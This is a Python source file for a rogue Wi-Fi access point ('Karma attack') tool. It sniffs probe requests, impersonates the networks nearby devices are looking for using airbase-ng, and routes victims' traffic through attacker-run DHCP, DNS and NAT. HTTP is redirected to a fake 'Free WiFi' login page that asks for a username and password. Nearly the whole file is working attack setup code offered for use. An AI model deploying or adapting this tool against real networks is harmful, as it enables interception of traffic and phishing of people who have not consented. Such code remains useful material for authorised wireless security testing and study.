"""
Karma Attack Module - Creates rogue access points based on probe requests
"""

import os
import sys
import time
import threading
import random
import subprocess
import requests
import signal
from werkzeug.serving import make_server
from flask import Flask, request, jsonify
from scapy.all import sniff, Dot11ProbeReq, Dot11, RadioTap, Dot11Beacon, Dot11Elt, Dot11Auth, Dot11AssoReq, sendp, RandMAC
from scapy.layers.dot11 import RSNCipherSuite, Dot11EltRSN, Dot11ProbeResp
from collections import Counter

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../')))
from web.shared import add_log_message_shared as add_log_message
from utils.network_utils import set_monitor_mode, set_managed_mode, sniff_probe_requests

# Network configuration
DHCP_CONF = "/etc/dnsmasq.conf"
FAKE_GATEWAY_IP = "192.168.50.1"
SUBNET = "192.168.50.0/24"
CAPTIVE_PORTAL_PORT = 9001
FAKE_MAC = "90:91:64:56:25:F5"
WEB_API_PORT = 5000  # Default Flask port

class FakeAP:
    def __init__(self, ssid, interface, channel=1):
        self.ssid = ssid
        self.interface = interface
        self.channel = channel
        self.mac = FAKE_MAC
        self.clients = set()
        self.airbase_process = None
        self.dnsmasq_process = None
        self.flask_process = None
        self.portal_thread = None
        self._stop_flask = threading.Event()

    def _check_interface_exists(self, interface, max_retries=10, delay=1):
        """Check if network interface exists"""
        for _ in range(max_retries):
            try:
                result = subprocess.run(
                    ["ip", "link", "show", interface],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    check=False
                )
                if result.returncode == 0:
                    return True
            except:
                pass
            time.sleep(delay)
        return False
        
    def start_ap(self):
        """Start airbase-ng to create the fake AP"""
        try:
            # Kill any existing airbase-ng processes
            subprocess.run(["sudo", "killall", "airbase-ng"], stderr=subprocess.DEVNULL)
            
            # Remove existing at0 interface if it exists
            subprocess.run(["sudo", "ip", "link", "set", "at0", "down"], stderr=subprocess.DEVNULL)
            subprocess.run(["sudo", "ip", "link", "delete", "at0"], stderr=subprocess.DEVNULL)
            
            add_log_message(f"[*] Launching fake AP for SSID: {self.ssid}")
            self.airbase_process = subprocess.Popen([
                "airbase-ng",
                "-e", self.ssid,
                "-c", str(self.channel),
                "-a", self.mac,
                "-v",  # Verbose output
                self.interface
            ], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # Wait for at0 interface to be created
            if not self._check_interface_exists("at0"):
                add_log_message("[-] Failed to create at0 interface")
                return False
                
            add_log_message("[+] Successfully created at0 interface")
            return True
            
        except Exception as e:
            add_log_message(f"[-] Error starting airbase-ng: {e}")
            return False

    def _configure_interface(self):
        """Configure the at0 interface with IP and routing"""
        try:
            # Bring down interface first
            subprocess.run(["sudo", "ip", "link", "set", "at0", "down"], check=True)
            time.sleep(1)

            # Flush any existing IP configuration
            subprocess.run(["sudo", "ip", "addr", "flush", "dev", "at0"], check=True)
            
            # Bring up interface
            subprocess.run(["sudo", "ip", "link", "set", "at0", "up"], check=True)
            time.sleep(1)

            # Add IP address with broadcast
            subprocess.run([
                "sudo", "ip", "addr", "add",
                f"{FAKE_GATEWAY_IP}/24",
                "broadcast", "192.168.50.255",
                "dev", "at0"
            ], check=True)
            time.sleep(1)

            # Check current routing table
            add_log_message("[*] Current routing table:")
            subprocess.run(["ip", "route", "show"], check=True)

            # Try to delete any existing route for our subnet first
            try:
                subprocess.run(["sudo", "ip", "route", "del", SUBNET], stderr=subprocess.DEVNULL)
            except:
                pass

            # Add route without checking return code
            try:
                subprocess.run(["sudo", "ip", "route", "add", SUBNET, "dev", "at0"])
            except:
                # If adding route fails, try alternative approach
                try:
                    # Try adding route with specific gateway
                    subprocess.run([
                        "sudo", "ip", "route", "add",
                        SUBNET,
                        "via", FAKE_GATEWAY_IP,
                        "dev", "at0"
                    ])
                except:
                    add_log_message("[-] Warning: Could not add route, continuing anyway...")

            # Verify final configuration
            add_log_message("[*] Final interface configuration:")
            subprocess.run(["ip", "addr", "show", "dev", "at0"])
            add_log_message("[*] Final routing table:")
            subprocess.run(["ip", "route", "show"])
            
            return True
        except subprocess.CalledProcessError as e:
            add_log_message(f"[-] Error configuring interface: {str(e)}")
            return False

    def setup_network(self):
        """Configure network interface and services"""
        try:
            # Kill any existing DHCP servers
            self._kill_existing_dhcp()
            
            # Start airbase-ng to create at0 interface
            if not self.start_ap():
                return False
            
            # Configure network interface
            add_log_message("[*] Setting up network interface...")
            if not self._configure_interface():
                return False

            # Configure IP forwarding
            subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], check=True)
            
            # Configure firewall rules
            subprocess.run(["sudo", "iptables", "-t", "nat", "-F"], check=True)
            subprocess.run(["sudo", "iptables", "-F"], check=True)
            subprocess.run(["sudo", "iptables", "-X"], check=True)
            
            # Add NAT rules
            subprocess.run([
                "sudo", "iptables", "-t", "nat", "-A", "POSTROUTING",
                "-o", "eth0", "-j", "MASQUERADE"
            ], check=True)
            
            # Add forwarding rules
            subprocess.run([
                "sudo", "iptables", "-A", "FORWARD",
                "-i", "at0", "-o", "eth0", "-j", "ACCEPT"
            ], check=True)
            
            # Add captive portal redirect
            subprocess.run([
                "sudo", "iptables", "-t", "nat", "-A", "PREROUTING",
                "-i", "at0", "-p", "tcp", "--dport", "80",
                "-j", "REDIRECT", "--to-port", str(CAPTIVE_PORTAL_PORT)
            ], check=True)

            # Write and start DHCP server
            self._write_dnsmasq_config()
            self._start_dnsmasq()
            
            # Start captive portal
            self._start_captive_portal()
            
            add_log_message("[+] Network setup complete")
            return True
            
        except subprocess.CalledProcessError as e:
            add_log_message(f"[-] Error setting up network: {e}")
            return False
        except Exception as e:
            add_log_message(f"[-] Unexpected error: {e}")
            return False

    def _kill_existing_dhcp(self):
        """Kill any existing DHCP servers"""
        try:
            subprocess.run(["sudo", "systemctl", "stop", "isc-dhcp-server"], stderr=subprocess.DEVNULL)
            subprocess.run(["sudo", "systemctl", "stop", "dhcpd"], stderr=subprocess.DEVNULL)
            subprocess.run(["sudo", "killall", "dhcpd"], stderr=subprocess.DEVNULL)
            subprocess.run(["sudo", "killall", "dnsmasq"], stderr=subprocess.DEVNULL)
        except:
            pass

    def _write_dnsmasq_config(self):
        """Write dnsmasq configuration file"""
        config = f"""
interface=at0
dhcp-range=192.168.50.10,192.168.50.100,12h
dhcp-option=3,{FAKE_GATEWAY_IP}
dhcp-option=6,{FAKE_GATEWAY_IP}
server=8.8.8.8
log-queries
log-dhcp
"""
        with open(DHCP_CONF, "w") as f:
            f.write(config)

    def _start_dnsmasq(self):
        """Start dnsmasq DHCP server"""
        try:
            self.dnsmasq_process = subprocess.Popen(
                ["dnsmasq", "--conf-file=" + DHCP_CONF],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            add_log_message("[+] Started DNSMASQ server")
        except Exception as e:
            add_log_message(f"[-] Failed to start DNSMASQ: {e}")

    def _start_captive_portal(self):
        """Start the captive portal"""
        app = Flask(__name__)

        @app.route('/')
        def index():
            return """
            <h1>Welcome to Free WiFi</h1>
            <p>Please login to access the internet.</p>
            <form>
                <input type="text" placeholder="Username">
                <input type="password" placeholder="Password">
                <button type="submit">Login</button>
            </form>
            """

        # Start Flask in a separate thread with proper server handling
        def run_flask():
            try:
                # Create a proper server instance
                self.flask_process = make_server('0.0.0.0', CAPTIVE_PORTAL_PORT, app)
                self.flask_process.serve_forever()
            except OSError as e:
                if e.errno == 98:  # Address already in use
                    add_log_message("[-] Captive portal port already in use. Trying to kill existing process...")
                    try:
                        subprocess.run(["sudo", "fuser", "-k", f"{CAPTIVE_PORTAL_PORT}/tcp"], check=False)
                        time.sleep(2)  # Wait for the port to be freed
                        # Try running again
                        self.flask_process = make_server('0.0.0.0', CAPTIVE_PORTAL_PORT, app)
                        self.flask_process.serve_forever()
                    except Exception as e2:
                        add_log_message(f"[-] Failed to start captive portal: {e2}")
                else:
                    add_log_message(f"[-] Failed to start captive portal: {e}")

        self.portal_thread = threading.Thread(target=run_flask)
        self.portal_thread.daemon = True
        self.portal_thread.start()
        add_log_message("[+] Started captive portal")

    def cleanup(self):
        """Cleanup all resources"""
        add_log_message("[*] Cleaning up resources...")
        
        # Stop the captive portal
        try:
            if self.flask_process:
                self.flask_process.shutdown()
                if self.portal_thread and self.portal_thread.is_alive():
                    self.portal_thread.join(timeout=5)
            # Kill any remaining process on the port
            subprocess.run(["sudo", "fuser", "-k", f"{CAPTIVE_PORTAL_PORT}/tcp"], check=False)
        except:
            pass

        # Stop airbase-ng
        try:
            if self.airbase_process:
                self.airbase_process.terminate()
                self.airbase_process.wait(timeout=5)
        except:
            pass

        # Stop dnsmasq
        try:
            if self.dnsmasq_process:
                self.dnsmasq_process.terminate()
                self.dnsmasq_process.wait(timeout=5)
        except:
            pass

        # Kill any remaining processes
        try:
            subprocess.run(["sudo", "killall", "airbase-ng"], stderr=subprocess.DEVNULL)
            subprocess.run(["sudo", "killall", "dnsmasq"], stderr=subprocess.DEVNULL)
        except:
            pass

        # Clean up network interfaces
        try:
            subprocess.run(["sudo", "ip", "link", "set", "at0", "down"], stderr=subprocess.DEVNULL)
            subprocess.run(["sudo", "ip", "link", "delete", "at0"], stderr=subprocess.DEVNULL)
        except:
            pass

        # Reset iptables rules
        try:
            subprocess.run(["sudo", "iptables", "-t", "nat", "-F"], check=False)
            subprocess.run(["sudo", "iptables", "-F"], check=False)
            subprocess.run(["sudo", "iptables", "-X"], check=False)
        except:
            pass

        add_log_message("[+] Cleanup completed")

def get_probe_requests(interface, duration):
    """
    Get probe requests using the web API
    
    Args:
        interface (str): Network interface to use
        duration (int): How long to scan for in seconds
        
    Returns:
        list: List of discovered SSIDs
    """
    try:
        # Call the web API endpoint
        response = requests.get(
            f'http://localhost:{WEB_API_PORT}/sniff_probe_requests',
            params={'interface': interface, 'duration': duration}
        )
        
        if response.status_code == 200:
            return response.json()
        else:
            error = response.json().get('error', 'Unknown error')
            add_log_message(f"[-] Failed to get probe requests: {error}")
            return []
            
    except Exception as e:
        add_log_message(f"[-] Error calling probe request API: {e}")
        return []

def karma_worker(interface, target_ssid, duration, stop_event):
    """
    Main worker function for Karma attack
    
    Args:
        interface (str): Network interface in monitor mode
        target_ssid (str): Target SSID to spoof
        duration (int): Duration to run in seconds
        stop_event (threading.Event): Event to signal when to stop
    """
    try:
        add_log_message(f"[Karma] Starting attack targeting SSID: {target_ssid}")
        add_log_message(f"[Karma] Using interface: {interface}")
        
        # Create and setup AP
        ap = FakeAP(target_ssid, interface)
        
        # Setup network configuration
        if not ap.setup_network():
            add_log_message("[-] Failed to setup network configuration")
            return
            
        start_time = time.time()
        
        # Run the AP for the specified duration
        while not stop_event.is_set() and (time.time() - start_time) < duration:
            time.sleep(1)
            
        if not stop_event.is_set():
            add_log_message("[Karma] Attack completed")
        else:
            add_log_message("[Karma] Attack stopped by user")
            
    except Exception as e:
        add_log_message(f"[Karma] Error in karma attack: {e}")
        raise
    finally:
        # Cleanup
        try:
            ap.cleanup()
            set_managed_mode(interface)
            add_log_message("[Karma] Interface reset to managed mode")
        except Exception as e:
            add_log_message(f"[Karma] Error during cleanup: {e}")

def scan_channels(interface, duration=5):
    """
    Scan WiFi channels to find the most active one
    
    Args:
        interface (str): Network interface to use
        duration (int): How long to scan for in seconds
    
    Returns:
        int: Most active channel number
    """
    add_log_message(f"[*] Scanning Wi-Fi channels on {interface} for {duration} seconds...")
    channel_counts = Counter()
    stop_sniffing = threading.Event()

    def channel_hopper():
        while not stop_sniffing.is_set():
            channel = random.randint(1, 11)
            try:
                subprocess.run(["sudo", "iwconfig", interface, "channel", str(channel)], 
                             check=True, stderr=subprocess.DEVNULL)
            except subprocess.CalledProcessError:
                continue
            time.sleep(0.5)

    def packet_handler(pkt):
        if pkt.haslayer(Dot11):
            try:
                channel = int(ord(pkt[Dot11].notdecoded[-1:])) if hasattr(pkt[Dot11], 'notdecoded') else None
                if channel:
                    channel_counts[channel] += 1
            except:
                pass

    # Start channel hopper thread
    hopper_thread = threading.Thread(target=channel_hopper)
    hopper_thread.daemon = True
    hopper_thread.start()

    # Sniff for the specified duration
    sniff(iface=interface, timeout=duration, prn=packet_handler, store=0)
    
    # Stop the channel hopper
    stop_sniffing.set()
    hopper_thread.join()

    # Select best channel
    best_channel = channel_counts.most_common(1)
    selected_channel = best_channel[0][0] if best_channel else 1
    
    add_log_message(f"[+] Selected best Wi-Fi channel: {selected_channel} (used by {channel_counts[selected_channel]} networks)")
    return selected_channel

def sniff_probe_requests(interface, duration):
    """
    Sniff for probe requests to find target SSIDs
    
    Args:
        interface (str): Network interface to use
        duration (int): How long to sniff for in seconds
    
    Returns:
        list: List of discovered SSIDs
    """
    add_log_message(f"[*] Sniffing for probe requests on {interface} for {duration} seconds...")
    ssids = set()
    start_time = time.time()

    def packet_handler(pkt):
        if pkt.haslayer(Dot11ProbeReq):
            try:
                ssid = pkt.info.decode(errors="ignore")
                if ssid and len(ssid.strip()) > 0:
                    ssids.add(ssid)
            except:
                pass

    # Start sniffing with the specified duration
    sniff(iface=interface, 
          timeout=duration,  # Use the provided duration
          prn=packet_handler,
          store=0)  # Don't store packets to save memory

    add_log_message(f"[+] Found {len(ssids)} unique SSIDs in {duration} seconds")
    return list(ssids)